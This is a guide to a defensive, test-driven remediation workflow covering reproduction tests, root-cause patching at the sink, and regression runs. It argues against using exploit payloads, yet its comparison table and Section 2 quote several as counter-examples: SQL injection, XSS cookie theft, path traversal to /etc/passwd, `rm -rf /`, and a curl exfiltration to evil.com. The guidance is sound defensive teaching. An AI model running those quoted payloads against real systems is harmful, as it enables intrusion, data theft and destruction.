# Closed-Loop Defensive Remediation

Defensive security engineering requires verifiable, durable fixes that eliminate root vulnerabilities without introducing regressions. The **Closed-Loop Remediation Pattern** (inspired by Strix defensive methodologies) establishes a strict test-driven workflow: every vulnerability remediation must be proven by a failing test harness, resolved by an architectural patch at the sink, and verified by passing regression suites.

Crucially, this pattern enforces **ZERO offensive exploit payloads**. Audits and remediations are software quality operations, not penetration testing exercises.

---

## 1. The Closed-Loop Triad

```text
┌─────────────────────────────────────────────────────────────┐
│                 STEP 1: REPRODUCTION TEST                   │
│   Author failing test in project's native test framework    │
│   • Uses structural boundary inputs (NON-OFFENSIVE)         │
│   • Demonstrates contract violation or unhandled state      │
│   • Status: RED (Fails on vulnerable codebase)              │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│                 STEP 2: ARCHITECTURAL PATCH                 │
│   Implement structural fix at the Sink or Boundary Layer    │
│   • Parameterization, strict schema, type safety, immutability│
│   • No fragile blacklists, regex filters, or bypassable escaping│
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│                 STEP 3: REGRESSION PASS                     │
│   Verify fix and test suite consistency                     │
│   • Reproduction test: GREEN (Passes)                       │
│   • Entire project test suite: GREEN (Zero regressions)     │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. Principle: Zero Offensive Exploit Payloads

Traditional security reports often include aggressive, weaponized payloads (e.g., `admin' OR '1'='1'--`, `<script>alert(document.cookie)</script>`, `; rm -rf / ;`, `$(curl attacker.com)`). These payloads are harmful, trigger false security alarms in CI/CD pipelines, and focus on exploit demonstration rather than structural software correctness.

### The Defensive Boundary Standard:
Instead of exploit strings, use **Defensive Boundary Inputs** that isolate and test software invariants:

| Vulnerability Class | ❌ Offensive Exploit Payload | ✅ Defensive Boundary Test Input | Invariant Tested |
|---|---|---|---|
| **SQL / Persistence** | `' UNION SELECT password FROM users--` | `'O''Reilly'` or `test'value` | Query compiler treats input strictly as literal data, preventing syntax disruption. |
| **Command Execution** | `; curl evil.com/exfil?d=$(whoami)` | File named `file with spaces & symbols.txt` | Argument array preserves exact string boundaries without subshell interpolation. |
| **XSS / HTML Injection** | `<img src=x onerror=fetch(...)>` | `Safe & <Bold> "Text"` | Template engine escapes HTML entities or sets DOM textContent directly. |
| **Path Traversal** | `../../../../etc/passwd` | Path segment `../boundary_test` | Canonicalized path resolution (`realpath`) verifies confinement to base directory. |
| **Access Control / IDOR** | Forging JWT claims or brute-forcing IDs | Mock user context $B$ requesting resource owned by user context $A$ | Access policy returns `403 Forbidden` or filters by tenant ID. |

---

## 3. Step 1: Authoring the Reproduction Test

The reproduction test must be written using the target project's native test runner (e.g., `pytest`, `PHPUnit`, `Jest`, `Vitest`, `xUnit`, `go test`, `cargo test`).

### Requirements for Reproduction Tests:
1. **Native Integration**: Must seamlessly run using standard project commands (e.g., `npm test`, `pytest`, `cargo test`).
2. **Deterministic Failure**: The test must assert that the system maintains its invariant. On the vulnerable codebase, this test **must fail** (RED) because the boundary is violated.
3. **No External Side Effects**: The test must be self-contained, using in-memory databases, mocks, or isolated test fixtures.

#### Example (Jest / Node.js):
```typescript
// test/security/user-query.security.test.ts
import { describe, it, expect } from 'vitest';
import { findUserByHandle } from '../src/repositories/userRepository';

describe('UserRepository: Parameter Boundary Invariant', () => {
  it('should safely query handles containing single quotes without query syntax errors', async () => {
    // Input contains legitimate character that would break raw SQL string interpolation
    const handleWithQuote = "d'artagnan";
    
    // Expectation: Should execute without database syntax error and return matching record or null
    await expect(findUserByHandle(handleWithQuote)).resolves.toBeDefined();
  });
});
```

---

## 4. Step 2: Architectural Root Patching

Remediation must occur at the root cause—typically the sink or the system boundary—using robust architectural controls rather than localized superficial filters.

### Defensive Hierarchy:

```text
Best       ┌─────────────────────────────────────────────────────────┐
 ▲         │ 1. Structural Immunity: Parameterized queries, ORMs,    │
 │         │    type-safe APIs, memory-safe data structures.         │
 │         ├─────────────────────────────────────────────────────────┤
 │         │ 2. Schema Enforcement: Strict declarative validation    │
 │         │    (types, length, regex, bounds, enum allowlists).     │
 │         ├─────────────────────────────────────────────────────────┤
 │         │ 3. Contextual Encoding: Native output encoders applied  │
 │         │    at the boundary (e.g., DOM textContent, HTML escape).│
 ▼         ├─────────────────────────────────────────────────────────┤
Worst      │ 4. Blacklisting / Regex Stripping: UNACCEPTABLE         │
           │    (Bypassable, fragile, causes unintended data loss).   │
           └─────────────────────────────────────────────────────────┘
```

### Remediation Rules:
- **Never rely on blacklists**: Do not attempt to strip `'`, `"`, `<>`, or `../` using regexes.
- **Enforce Separation of Code and Data**: Always use driver-level parameter binding for queries and structured argument arrays for process execution.
- **Fail Fast & Explicitly**: If input violates strict schema boundaries, reject it immediately with a structured error.

---

## 5. Step 3: Regression Verification

Once the architectural patch is applied:

1. **Run the Reproduction Test**:
   - Verify that the test that previously failed now passes (GREEN).
2. **Run Full Test Suite**:
   - Run the entire test suite of the application to ensure that no existing functionality, endpoints, or data workflows were broken by the patch.
3. **Document Clean State**:
   - Document the test command, test output, and passing assertions in the final audit report.
